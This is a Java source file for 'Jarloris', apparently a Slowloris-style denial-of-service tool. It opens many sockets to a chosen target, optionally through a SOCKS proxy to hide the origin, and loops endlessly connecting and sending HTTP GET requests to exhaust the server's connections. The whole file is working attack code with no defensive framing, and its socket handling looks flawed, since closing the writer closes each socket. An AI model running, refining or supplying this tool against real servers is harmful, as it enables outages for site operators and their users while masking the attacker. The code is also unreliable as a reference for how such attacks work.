package jarloris;

import com.google.common.net.HostAndPort;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Jarloris implements Runnable {

    private HostAndPort _target;
    private HostAndPort _proxy;
    private ArrayList<Socket> sockets = new ArrayList<Socket>();

    public Jarloris(String targetIP, int targetPort, String proxyIP, int proxyPort, boolean useProxy, int socks) {
        _target = HostAndPort.fromParts(targetIP, targetPort);
        _proxy = HostAndPort.fromParts(proxyIP, proxyPort);
        for (int k = 0; k < socks; k++) {
            if (useProxy) {
                Proxy prox = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(proxyIP, proxyPort));
                sockets.add(new Socket(prox));
            } else {
                sockets.add(new Socket());
            }
        }
    }

    public void run() {
        boolean StopWorking = false;
        while (!StopWorking) {
            for (int i = 0; i < sockets.size(); i++) {
                if (sockets.get(i).isConnected()) {
                    PrintWriter pw = null;
                    try {
                        pw = new PrintWriter(sockets.get(i).getOutputStream());
                        pw.println("GET / HTTP/1.1");
                        pw.println("Host: " + sockets.get(i).getInetAddress());
                        pw.println();
                        pw.flush();
                    } catch (IOException ex) {
                        Logger.getLogger(Jarloris.class.getName()).log(Level.SEVERE, null, ex);
                    } finally {
                        pw.close();
                    }
                } else {
                    try {
                        InetSocketAddress socketAddress = new InetSocketAddress(_target.getHostText(), _target.getPort());
                        sockets.get(i).connect(socketAddress);
                    } catch (IOException ex) {
                        Logger.getLogger(Jarloris.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            }
        }
    }
}
